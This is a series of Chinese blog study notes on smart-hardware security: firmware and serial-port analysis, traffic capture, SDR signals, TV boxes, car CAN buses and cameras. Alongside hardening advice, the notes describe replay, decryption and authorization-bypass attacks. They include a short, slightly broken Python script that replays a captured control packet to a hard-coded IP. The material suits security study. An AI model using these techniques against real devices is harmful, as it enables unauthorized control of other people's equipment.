</blockquote>
<h2 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h2><h3 id="反编译Dalvik字节码文件"><a href="#反编译Dalvik字节码文件" class="headerlink" title="反编译Dalvik字节码文件"></a>反编译Dalvik字节码文件</h3><p>先将APK解压，找到classes.dex文件。</p>
<ol>
<li><p><strong>反编译为<code>smali</code>代码</strong></p>
<p> 使用apktool.jar反编译APK文件，命令格式为：</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar apktool.jar d APK文件 -o 输出目录</span><br></pre></td></tr></table></figure>
<p> smali目录中的文件即为反编译处的代码</p>
</li>
<li><p>反编译为jar包</p>
<p> 使用dex2jar反编译calsses.dex文件，编译完成后可用JD-GUI等工具打开查看</p>
</li>
</ol>
<h1 id="设备固件安全分析方法"><a href="#设备固件安全分析方法" class="headerlink" title="设备固件安全分析方法"></a>设备固件安全分析方法</h1><h2 id="固件概述"><a href="#固件概述" class="headerlink" title="固件概述"></a>固件概述</h2><p>固件就是写入EROM（eraseable Read-Only Memory，可擦制度存储器）、EEPROM（电可擦可编程只读存储器）</p>
<h2 id="调试串口获取shell"><a href="#调试串口获取shell" class="headerlink" title="调试串口获取shell"></a>调试串口获取shell</h2><h3 id="寻找串口"><a href="#寻找串口" class="headerlink" title="寻找串口"></a>寻找串口</h3><p>在PCB主板上寻找串口，采用观察法，利用万用表和串口数据接收工具基本可以定位到串口的位置。</p>
<p>一般情况下，串口至少包含以下四个引脚：</p>
<ul>
<li>VCC：电源电压，该引脚表明串口工作电压</li>
<li>GND：接地，该引脚电压通常与PCB地短接</li>
<li>TXD：数据发送引脚</li>
<li>RXD：数据接收引脚</li>
</ul>
<p>对于没有直接标明串口的PCB主板，在寻找串口时主要步骤为观察和验证</p>
<ol>
<li><p>观察</p>
<blockquote>
<p>通过万用表探测与其他GND短接的引脚，那么这一根就是GND，进而根据电势差寻找VCC.</p>
<p>VCC引脚的特点：</p>
<p>（1）VCC引脚通常被画成方形，其他引脚为圆形。</p>
<p>（2）串口端的VCC电压几乎不是3.3V就是5V。</p>
</blockquote>
</li>
<li><p>验证</p>
<blockquote>
<p>单独引出所怀疑的引脚后分别尝试接到计算机串口的RXD商，给板子供电后查看计算机串口调试工具有误数据或者字符串输出。厂商通常使用的破特率为115200,如果这个波特率下没有数据输出则尝试其他波特率。</p>
<p>如果最终没有输出，则这个结构要么不是串口，要么就是为安全起见固件程序并没有在串口上输出数据。</p>
</blockquote>
</li>
</ol>
<h3 id="获取访问控制权限"><a href="#获取访问控制权限" class="headerlink" title="获取访问控制权限"></a>获取访问控制权限</h3><p>以某款摄像头为例，通过USB-RS232接诶摄像头的串口至PC机，在给摄像头上电后，可以看到PC机串口调试工具显示出的log信息，如下如所示</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/20/H1hBMrpYxtjNiLF.png"></p>
<p>通过打断u-boot引导可以得知摄像头u-boot所支持的一些命令，这些命令可能已经对摄像头构成安全隐患了。</p>
<h2 id="调试固件"><a href="#调试固件" class="headerlink" title="调试固件"></a>调试固件</h2><h3 id="Binwalk信息收集"><a href="#Binwalk信息收集" class="headerlink" title="Binwalk信息收集"></a>Binwalk信息收集</h3><p>前提：分析固件文件首先需要了解文件结构、编程语言指令集、运行系统、文件压缩格式等。</p>
<p>首先可以用Binwalk初步扫描分析固件结构</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> binwalk NOE77101.bin</span></span><br></pre></td></tr></table></figure>
<p>也可以使用WinHex直接查看二进制文件。</p>
<h3 id="导入IDA分析"><a href="#导入IDA分析" class="headerlink" title="导入IDA分析"></a>导入IDA分析</h3><p>固件导入IDA，一般需要以下几个步骤：</p>
<ol>
<li>识别处理器类型，结合指令集编写解析模块插件。</li>
<li>结合处理器修复代码中的函数位置</li>
<li>确定固件代码段基址</li>
<li>重构符号表</li>
</ol>
<h2 id="本章小结"><a href="#本章小结" class="headerlink" title="本章小结"></a>本章小结</h2><p>固件分析是基本功</p>
<p>首先定位固件的存放位置，一般固件都存放在Flash芯片中，可以使用编程器通过Flash芯片把固件读取成二进制文件，或者下载bin文件。</p>
<p>然后需要使用固件分析软件将固件解压，对程序进行分析。</p>
<p>对于解压后是二进制的文件，需要导入IDA来分析流程和逻辑。</p>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X02)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x02)/</url>
    <content><![CDATA[<h1 id="网络协议安全分析方法"><a href="#网络协议安全分析方法" class="headerlink" title="网络协议安全分析方法"></a>网络协议安全分析方法</h1><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><h3 id="TcpDump"><a href="#TcpDump" class="headerlink" title="TcpDump"></a>TcpDump</h3><p>通常<code>TcpDump</code>将监视第一个网络接口上所有流过的数据包</p>
<blockquote>
<ol>
<li><p>监视指定网络接口的数据包（-i）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth1</span><br></pre></td></tr></table></figure>
</li>
<li><p>截获所有10.10.1.1的主机收到和发出的数据包（host）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump host 10.10.1.1</span><br></pre></td></tr></table></figure>
</li>
<li><p>截获指定主机和端口的数据包（tcp port、host）</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tcpdump tcp port 80 and host 10.10.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash">UDP同理</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
</blockquote>
<h3 id="TcpDump与Wireshark、Burpsuite"><a href="#TcpDump与Wireshark、Burpsuite" class="headerlink" title="TcpDump与Wireshark、Burpsuite"></a>TcpDump与Wireshark、Burpsuite</h3><p>Linux下使用<code>TcpDump</code></p>
<p>Windows下使用<code>Wireshark</code>、<code>Burpsuite</code></p>
<h2 id="流量的捕获"><a href="#流量的捕获" class="headerlink" title="流量的捕获"></a>流量的捕获</h2><p>有些智能硬件，在局域网内是直接通信的，那么就需要在手机上安装<code>TcpDump</code>然后抓包，发一些控制请求，分析数据包的内容。</p>
<p>档手机客户端在局域网内可以控制智能硬件的时候，就证明云端的控制和手机端的控制都一样。那么只要分析出手机客户端的内容就可以了。</p>
<h3 id="手机和云端"><a href="#手机和云端" class="headerlink" title="手机和云端"></a>手机和云端</h3><p>手机和云端之间的数据都包括控制请求、登陆请求、状态请求等，通常都是传统的HTTP协议，如果考虑安全的会加<code>HTTPS</code>协议。</p>
<h3 id="云端和设备"><a href="#云端和设备" class="headerlink" title="云端和设备"></a>云端和设备</h3><p>云端和设备之间的数据主要包括控制请求、状态请求的数据，这些数据都是从手机控制中转发过来的，设备和云端常见的控制协议包括<code>HTTPS</code>,<code>XMPP</code>,<code>MQTT</code>等。这些协议也是市面上标准化的物联网协议。</p>
<h3 id="手机和设备"><a href="#手机和设备" class="headerlink" title="手机和设备"></a>手机和设备</h3><p>手机和设备的数据比较特殊，在手机和设备之间的抓包有时是不通过网关传输啊的，所以在Wi-Fi上面是抓不到任何内容的。这时就需要在手机里安装TcpDump抓包功能。</p>
<p>通过对比发现，如果手机和设备的控制信息与云端和设备之间的控制信息相同，则说明云端只做数据转发工作，这时只要分析手机客户端的内容就可以了。</p>
<h2 id="流量分析方法与常见漏洞"><a href="#流量分析方法与常见漏洞" class="headerlink" title="流量分析方法与常见漏洞"></a>流量分析方法与常见漏洞</h2><p>在捕获到智能硬件的流量后，下一步就是分析流量，通过分析，可以大致推测出智能硬件的实现方法和工作流程。</p>
<h3 id="数据重放"><a href="#数据重放" class="headerlink" title="数据重放"></a>数据重放</h3><p>在捕获到一个控制请求之后会尝试其是否能够被重放，如果被重放，则证明该控制请求非常容易被伪造。</p>
<ol>
<li><p>HTTP重放</p>
<blockquote>
<p>BP抓包，repeater模块重放。</p>
</blockquote>
</li>
<li><p>TCP数据包重放</p>
<blockquote>
<p>可以写一个简单的脚本，或者使用<code>NC</code>的发包功能即可</p>
<p>例如从<code>Wireshark</code>抓取到智能硬件传输指令数据包，将包的数据赋值，写一个<code>Py</code>脚本重放，由与Wireshark将数据包内容转换为16进制，所以要先转码，脚本示例如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.conect((<span class="string">&#x27;121.41.20.214&#x27;</span>,<span class="number">9001</span>))</span><br><span class="line">d = <span class="string">&#x27;cc00000100000b00000100b0000400020000&#x27;</span></span><br><span class="line">d = d.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">s.send(d)</span><br><span class="line">r = s.recv(<span class="number">100</span>)</span><br><span class="line">print(r.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="数据解密"><a href="#数据解密" class="headerlink" title="数据解密"></a>数据解密</h3></li>
</ol>
<p>很多厂商会选择将传输数据加密来保证安全，但是由于软件设计的问题，有时可以将数据解密然后分析、篡改。</p>
<ol>
<li><p>HTTPS</p>
<blockquote>
<p>HTTPS，是以安全为目标的HTTP通道，加入了SSL协议。</p>
<p>启用HTTPS对流量分析并不会有太多障碍，可以通过替换证书的方式获取数据明文内容、篡改和重放。</p>
</blockquote>
</li>
<li><p>AES/DES</p>
<blockquote>
<p>很多厂商会选择AES/DES对称加密，即用特定字符串作为秘钥将数据加密，然后再用相同的字符串将消息还原。</p>
<p>如果没有妥善的保管秘钥，导致可以通过逆向APK、抓包等方法拿到秘钥，然后解密和篡改数据。</p>
</blockquote>
</li>
<li><p>数据篡改</p>
<blockquote>
<p>在不能对控制协议重放的前提下，需要通过篡改数据绕过防重放的机制来控制目标。</p>
<p>在对数据篡改前首先要对数据进行解密，解密之后可以看到数据的铭文及提交的参数。</p>
</blockquote>
</li>
<li><p>身份验证与越权</p>
<blockquote>
<p>智能硬件的最大危害就是在未经改装的情况下，横向控制所有的智能硬件。这种危害是建立在协议分析的基础上的，通过分析身份验证标识，判断其规律性，再接个控制请求，进行批量控制。</p>
</blockquote>
</li>
</ol>
<h2 id="本章小结"><a href="#本章小结" class="headerlink" title="本章小结"></a>本章小结</h2><p>在智能硬件流程中，不同位置的设备往不同的终端转发时会根据业务需求产生不同的控制指令。</p>
<p>本证街上的攻击方法：</p>
<ul>
<li>重放攻击</li>
<li>AES解密</li>
<li>数据篡改</li>
<li>绕过身份认证方式越权</li>
</ul>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X03)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x03)/</url>
    <content><![CDATA[<h1 id="软件定义无线电安全分析方法"><a href="#软件定义无线电安全分析方法" class="headerlink" title="软件定义无线电安全分析方法"></a>软件定义无线电安全分析方法</h1><h2 id="软件定义无线电"><a href="#软件定义无线电" class="headerlink" title="软件定义无线电"></a>软件定义无线电</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>软件定义无线电（SDR）是一种无线电通讯系统，它基于软件定义无线通信协议而非通过硬连线实现。</p>
<p>无线电技术的原理在于：导体中电流强弱的改变会产生无线电波，利用这一现象，通过调制可将信息加载与无线电波之上。当电波通过空间传播到达收信端，电波引起的点此上变化又会在导体中产生电流，通过解调将信息从电流变化中提取出来，就达到了信息传递的目的。</p>
<p>SDR具有以下两个特点：</p>
<ol>
<li><p>具有较强的灵活性</p>
<blockquote>
<p>可以通过增加软件模块，很容易的增加新的功能</p>
</blockquote>
</li>
<li><p>具有较强的开放性</p>
<blockquote>
<p>由于采用了标准化、模块化的结构，其硬件可以随着器件和技术的发展而更新或扩展，软件也可以随需要不断升级。</p>
</blockquote>
</li>
</ol>
<h3 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h3><p>如下图所示，中间的SDR overview模块主要由三部分组成：无限频率放大器（Radio Frequency Amplifier）、调谐器（Tuner）、模数转换模块（ADC）</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/20/zEdTJPrIyfuL8b9.png"></p>
<ul>
<li>天线模块（Antenna）用于接收电磁波信号</li>
<li>RF放大器主要通过自定义的增益值对接受到的微弱信号进行放大操作，增益的单一般用dB表示。</li>
<li>调谐器就像收音机或电视机用于选台的装置，从众多信号中选出一个自己需要的信号做分析。</li>
<li>ADC将从调谐器输出的RF信号转换为数字信号，这就是通常所说的采样（Sampling）</li>
<li>GUN Radio是一个开源软件平台，是一个学习、构建和部署SDR系统的免费软件开发工具套件。</li>
</ul>
<h2 id="SDR的分析方法"><a href="#SDR的分析方法" class="headerlink" title="SDR的分析方法"></a>SDR的分析方法</h2><h3 id="采样定理及信号处理频谱分析原理"><a href="#采样定理及信号处理频谱分析原理" class="headerlink" title="采样定理及信号处理频谱分析原理"></a>采样定理及信号处理频谱分析原理</h3><p><strong>采样定理：</strong>采样过程是指模拟信号经过A/D变换转换为数字信号的过程。信号采样后其频谱会产生周期延拓。采样定理是指为保证采样后信号的频谱形状不失真，采样频率必须大于信号中最高频率成分的两倍。</p>
<p>低噪声放大器（LAN）主要的功能是增加信号的强度，使信号的幅值增大。</p>
<h3 id="无线信号分析"><a href="#无线信号分析" class="headerlink" title="无线信号分析"></a>无线信号分析</h3><ol>
<li><p>分析钥匙信号</p>
<blockquote>
<p>目前，无线通信系统常用的频率为315MHz、332MHz、2.4GHz等。其中常见的汽车无线钥匙信号一般工作在315MHz和433MHz两个频段上，蓝牙和Wi-Fi的工作频段在2.4GHz上。</p>
<p>433MHz不仅用在汽车钥匙系统上，还有一些遥控门也采用该频段的无线信号来遥控门的开关。</p>
</blockquote>
</li>
<li><p>分析步骤</p>
<blockquote>
<p>（1）查看无线信号使用的调制方式是什么</p>
<p>（2）将抓取的无线信号转化成比特流</p>
<p>（3）分析系统存在的漏洞缺陷</p>
<p>（4）修复加固</p>
</blockquote>
</li>
</ol>
<h2 id="本章小结"><a href="#本章小结" class="headerlink" title="本章小结"></a>本章小结</h2><p>在软件定义无线电的应用中最大的问题就是没有加密和防止重放攻击的方法，所以对与无线电信号的分析至关重要。</p>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X04)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x04)/</url>
    <content><![CDATA[<h1 id="智能电视盒子安全分析"><a href="#智能电视盒子安全分析" class="headerlink" title="智能电视盒子安全分析"></a>智能电视盒子安全分析</h1><h2 id="智能电视盒子安全威胁分析"><a href="#智能电视盒子安全威胁分析" class="headerlink" title="智能电视盒子安全威胁分析"></a>智能电视盒子安全威胁分析</h2><h3 id="系统被植入木马，恶意应用的风险"><a href="#系统被植入木马，恶意应用的风险" class="headerlink" title="系统被植入木马，恶意应用的风险"></a>系统被植入木马，恶意应用的风险</h3><p>目前主流的电视盒子的底层系统都是Android平台，应此存在被植入的Android应用，甚至是Android木马的风险。</p>
<h2 id="智能电视遭受攻击的方式"><a href="#智能电视遭受攻击的方式" class="headerlink" title="智能电视遭受攻击的方式"></a>智能电视遭受攻击的方式</h2><h3 id="系统底层的攻击"><a href="#系统底层的攻击" class="headerlink" title="系统底层的攻击"></a>系统底层的攻击</h3><p>目前市面上大多智能电视是<code>Android TV</code>，由于Android原生代码中并没有开启身份验证和登录认证，一些厂商也没对智能电视的源码进行修改，直接通过root权限控制系统，导致市面上<code>Android TV</code>很容易被黑客攻击。攻击者往往可以直接获取电视盒子系统底层的权限。</p>
<p>例如：很多电视盒子为了测试方便会开启Android远程adb接口，很多情况下这些接口被直接暴露在公网上。攻击者利用这些接口可以直接获取Android系统的root权限，种植root木马。</p>
<p>一些智能电视盒子可以带有打开网页的功能，而很多智能电视盒子载入Web页面时使用了Android原生浏览器<code>WebView</code>组件，这个组件层爆出过多个高危漏洞，攻击者只需要因哟受害者打开一个精心构造的网页，便可以直接给系统底层种植木马。</p>
<h3 id="云端服务器的攻击"><a href="#云端服务器的攻击" class="headerlink" title="云端服务器的攻击"></a>云端服务器的攻击</h3><p>智能盒子的视频内容都来自云端服务器，而一些厂商的云服务还都存在各种各样的安全漏洞，例如SQL注入、文件上传的传统Web漏洞。攻击者利用漏洞控制云服务器，进而可以通过推送<code>ota</code>升级、篡改云端接口等方法实现对智能电视短的攻击</p>
<h3 id="电视盒子应用层的攻击"><a href="#电视盒子应用层的攻击" class="headerlink" title="电视盒子应用层的攻击"></a>电视盒子应用层的攻击</h3><p>有些电视盒子会在系统桑开启Web服务，与用户通过手机端调用Web API接口来实现对电视盒子的远程控制，例如操作遥控器、安装卸载应用。</p>
<h2 id="智能电视盒子漏洞"><a href="#智能电视盒子漏洞" class="headerlink" title="智能电视盒子漏洞"></a>智能电视盒子漏洞</h2><ol>
<li><p>利用APP非授权控制电视</p>
<blockquote>
<p>第三方APP未经授权与身份验证即可控制电视</p>
</blockquote>
</li>
<li><p>智能电视信息泄露</p>
<blockquote>
<p>智能电视未对相关配置文件进行访问权限限制，在未经认证的情况下，任意用户都能访问智能电视的配置文件。</p>
</blockquote>
</li>
<li><p>智能电视遥控器会话劫持漏洞</p>
<blockquote>
<p>控制信息传输过程中使用了未加密的HTTP协议，可造成在同语句往内通过分析智能电视控制参数，劫持智能遥控器控制权限的安全隐患。</p>
</blockquote>
</li>
<li><p>绕过验证机制，远程任意APK安装漏洞</p>
<blockquote>
<p>智能电视使用手机请求安装APK功能时，是使用session id作为验证交互的，但验证session实在手机本地APP中进行验证的，从而造成了无需验证就可以安装任意的APK应用软件，并且利用该漏洞绕过未知的APK应用检测的情况</p>
</blockquote>
</li>
</ol>
<h2 id="智能电视盒子类产品安全建议"><a href="#智能电视盒子类产品安全建议" class="headerlink" title="智能电视盒子类产品安全建议"></a>智能电视盒子类产品安全建议</h2><ol>
<li>对于底层采用Android系统的电视盒子，首先应做好对Android西永的加固和防护，限制系统权限，不root系统，关闭远程<code>adb</code>调试接口，保持Android系统的版本更新，有必要的话可以安装反病毒软件。</li>
<li>对于运行在系统上的应用程序，应遵循权限最小化原则，不授予应用不必要的权限，同事加强开发人员的安全培训，减少应用程序中的安全漏洞。</li>
<li>对于云服务，设备厂商应加强对开发和运维人员的安全培训，较少开发中漏洞的产生。同事可部署相关的安全防护设备，防止黑客利用云服务的漏洞对企业、用户进行攻击。</li>
</ol>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X05)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x05)_/</url>
    <content><![CDATA[<h1 id="智能汽车安全分析"><a href="#智能汽车安全分析" class="headerlink" title="智能汽车安全分析"></a>智能汽车安全分析</h1><h2 id="汽车总线架构及原理"><a href="#汽车总线架构及原理" class="headerlink" title="汽车总线架构及原理"></a>汽车总线架构及原理</h2><p>随着汽车内部的ECU（电子控制单元，又称“行车电脑“），当攻击者从互联网与CAN-BUS总线进行通信时，就可以利用互联网直接刷写或控制汽车的ECU。破解者一般会逐步破解每个ECU单元的通信协议，得到入口权限，再通过计算机控制汽车的刹车板、方向盘等原件。</p>
<h2 id="汽车遭受攻击的方式"><a href="#汽车遭受攻击的方式" class="headerlink" title="汽车遭受攻击的方式"></a>汽车遭受攻击的方式</h2><ol>
<li>物理控制：通过OBD(车载自动诊断系统)端口入侵。</li>
<li>近场控制：通过蓝牙、Wi-Fi车载信息系统单元、射频进行控制。</li>
<li>远程控制：通过破解运营商网络、云服务系统、3G/4G进行控制。</li>
</ol>
<p>CAN总线上的任何设备都能够查看和发送消息到其他设备，是整个车辆安全问题之所在。</p>
<p>在总线上的任何设备都可以伪装成符合标准规范的，无需身份认证和验证。</p>
<h2 id="CAN总线"><a href="#CAN总线" class="headerlink" title="CAN总线"></a>CAN总线</h2><p>CAN总线是一种串行通信协议，具有较高的通信速率和较强的抗干扰能力，可以作为现成总线应用于电磁噪声较大的场合。</p>
<p>通常情况下CAN总线网络都是独立的网络，所以没有网络层，只有物理层和数据链路层。</p>
<p>CAN总线并不采用物理地址的模式传送数据，而是每个消息有自己的标识符用来识别总线上的节点。</p>
<p>标识符主要有两个功能：</p>
<ol>
<li>消息滤坡</li>
<li>消息优先级确定</li>
</ol>
<p>总线访问采用舵主原则，所有节点都可以作为主节点占用总线。</p>
<p>CAN总线通信的优势和特点：</p>
<blockquote>
<ol>
<li>CAN总线上任意节点均可在任意时刻主动地向其他节点发起通信，节点没有主从之分，但在同一时刻优先级高的节点能获得总线的使用权，在高优先级的节点释放总线后，任意节点都可使用总线。</li>
<li>CAN总线传输波特率在5Kbit/s-1Mbit/s，在5Kbit/s的通信破特率下最远传输距离可以达到10Km，即使在1Mbit/s的破特率下也能传输40m的距离。</li>
<li>CAN总线采用载波监听多路访问、逐位仲裁的非破坏性总线仲裁技术。</li>
<li>CAN总线所挂接的节点数量主要取决于CAN总线收发器或驱动器。</li>
<li>CAN总线定义使用了硬件保温滤波，可实现点对点及点对多点的通信方式，不需要软件来控制。</li>
<li>CAN总线通信介质可采用双绞线、同轴电缆或光纤。</li>
</ol>
</blockquote>
<h2 id="CAN总线的数据格式"><a href="#CAN总线的数据格式" class="headerlink" title="CAN总线的数据格式"></a>CAN总线的数据格式</h2><p>CAN协议有如图所示的五种不同类型的帧格式</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/21/QBpfjcAl38tGD6d.png"></p>
<h2 id="汽车总线安全验证"><a href="#汽车总线安全验证" class="headerlink" title="汽车总线安全验证"></a>汽车总线安全验证</h2><p>汽车CAN网络逆向分析过程主要分为4个步骤：筛选、定位、破解信号以及验证和保存，如图：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/21/39FtizTWPDyEKfC.png"></p>
<p>汽车总线的破解过程非常简单，主要就是观察汽车动作和CAN数据的变化。</p>
<h2 id="汽车信息安全指导建议"><a href="#汽车信息安全指导建议" class="headerlink" title="汽车信息安全指导建议"></a>汽车信息安全指导建议</h2><p>目前，汽车最大的安全风险在于汽车总线本身及汽车联网的部件。启程总线在设计之初是使用在封闭式的网络环境下，所以在封闭的网络环境下没有考虑到网络安全问题。</p>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X06)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x06)_/</url>
    <content><![CDATA[<h1 id="智能安防类产品安全分析"><a href="#智能安防类产品安全分析" class="headerlink" title="智能安防类产品安全分析"></a>智能安防类产品安全分析</h1><p>智能安防是通过传感器+互联网盒子的方式，实现在互联网上对家庭安全的远程管理。</p>
<h2 id="智能安防设备架构分析"><a href="#智能安防设备架构分析" class="headerlink" title="智能安防设备架构分析"></a>智能安防设备架构分析</h2><p>智能安防设备主要由传感器和报警器组成。主要的传感器有宫外显传感器、温度传感器、烟雾传感器、电磁传感器、渗水传感器。</p>
<p>这些传感器由无线传输模块将报警的信息发送到中央控制盒子，中央控制盒子通过互联网介入云端进行展示。</p>
<h2 id="智能安防设备脆弱性分析"><a href="#智能安防设备脆弱性分析" class="headerlink" title="智能安防设备脆弱性分析"></a>智能安防设备脆弱性分析</h2><p>智能安防设备传感器和中央控制盒子的连接都是用无线传输技术，有ZigBee的解决方案，也有RF的解决方案。</p>
<ol>
<li>ZigBee：在ZigBee配置不当的情况下，会泄露组网密码，导致攻击者可以伪造设备对重要控制盒子发起告警。</li>
<li>RF：在面对防重放攻击时不能提供有效地防护，同样也会造成误报、漏报的问题。</li>
</ol>
<p>针对智能安防设备的主要攻击面存在于<strong>本地的无线传输协议</strong>、<strong>云端</strong>、<strong>中央控制盒子</strong>和<strong>手机APP</strong>这四个方面。</p>
<h3 id="MQTT协议"><a href="#MQTT协议" class="headerlink" title="MQTT协议"></a>MQTT协议</h3><p>MQTT是一个物联网传输协议，它被设计用于轻量级的发布/订阅式消息传输，旨在为低带宽和不稳定的网络环境中的物联网设备提供可靠的网络服务。</p>
<p>MQTT的设计思想是开源、可靠、轻巧、简单，MQTT的传输格式非常精小，最小的数据包只有两个比特，且无应用消息头。MQTT可以保证消息的可靠性，它包括三种不同的服务质量（最多只传一次、最少被传一次、一次且只传一次），如果客户端意外掉线，可以使用“遗愿”发布一条消息，同事支持持久订阅。</p>
<p>MQTT在物联网中的优势如下：</p>
<ol>
<li><p>可靠传输</p>
<blockquote>
<p>MQTT可以保证消息可靠安全的传输，并可以与企业应用简易集成。</p>
</blockquote>
</li>
<li><p>消息推送</p>
<blockquote>
<p>支持消息实时通知、有丰富的推送内容、灵活的Pub-Sub及消息存储和过滤。</p>
</blockquote>
</li>
<li><p>低带宽、低耗能、低成本。</p>
<blockquote>
<p>占用移动应用程序带宽小，硬切带宽利用率高，耗电量较少。</p>
</blockquote>
</li>
</ol>
<h2 id="智能安防类设备安全建议"><a href="#智能安防类设备安全建议" class="headerlink" title="智能安防类设备安全建议"></a>智能安防类设备安全建议</h2><blockquote>
<ol>
<li>智能安防设备的传感器在组建无线网络组建时，建议对组网的秘钥进行加密传输，在使用ZigBee时，注意出事秘钥的加密传输。对射频传感器进行随机化的编码认证，验证发射射频源的合法性，保证不会被重放攻击影响。</li>
<li>注意对物联网协议的安全配置，关闭与业务不想管的端口及服务。对物联网协议认证，对端传输进行加密和身份验证，保障登陆设备是合法的智能终端</li>
<li>对APP进行安全加固，防止黑客对APP进行逆向分析，通过调试APP打印设备关键请求地址及内容，保护云端API的安全性。</li>
</ol>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(0X07)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x07)_/</url>
    <content><![CDATA[<h1 id="智能摄像头安全分析"><a href="#智能摄像头安全分析" class="headerlink" title="智能摄像头安全分析"></a>智能摄像头安全分析</h1><p>工业安防摄像头的使用场景大多数是在封闭的网络环境中，没有考虑过网络安全的问题，所以智能家庭摄像头在互联网的应用给用户带来了一些安全隐患。</p>
<h2 id="智能摄像头的网络结构"><a href="#智能摄像头的网络结构" class="headerlink" title="智能摄像头的网络结构"></a>智能摄像头的网络结构</h2><p>智能摄像头的架构都包含云端、手机端和设备终端</p>
<p>摄像头的云端服务器会存放控制程序及管理平台的内容</p>
<p>摄像头的手机终端会存放一些传输加密的秘钥，与云端的重要API接口，以及存放用户注册流程、密码修改流程、登陆流程、绑定流程等信息。</p>
<p>设备终端会存放一下设备的密码、与云端交互的指令、控制协议等重要信息。</p>
<h3 id="短信验证码安全问题"><a href="#短信验证码安全问题" class="headerlink" title="短信验证码安全问题"></a>短信验证码安全问题</h3><p>正常情况下，在注册手机号和重置密码时都需要进行短信验证码验证，这是为了保证手机号真实存在，并且可以判断用户对设备的合法控制身份。而这里的短信验证码存在安全问题就导致了可以注册任意手机号、修改任意手机号的密码等安全问题。</p>
<h3 id="部分功能存在越权"><a href="#部分功能存在越权" class="headerlink" title="部分功能存在越权"></a>部分功能存在越权</h3><p>部分设备只需要知道设备ID即可使用任意账户越权控制设备。</p>
<h2 id="安全修复建议"><a href="#安全修复建议" class="headerlink" title="安全修复建议"></a>安全修复建议</h2><blockquote>
<ol>
<li>对于摄像头上的应用程序和服务，应有完善合理的健全机制来确保摄像头隐私内容不被第三方获取。例如摄像头经常开启的RTSP服务，如果不设置密码，任何人都可以通过视频播放软件直接获得视频内容。常见的Web、FTP等服务，如果涉及用户的隐私信息，都应做有效的身份认证。</li>
<li>对于云服务来说，出来要避免传统的Web漏洞，对于存放在云端的视频备份，也应要做必要的加密处理，防止因云服务器被攻陷而导致用户隐私泄露</li>
<li>手机端的APP应该做必要的加固、混淆处理，增加逆向破解的成本，避免攻击者通过APP逆向分析业务逻辑。</li>
</ol>
</blockquote>
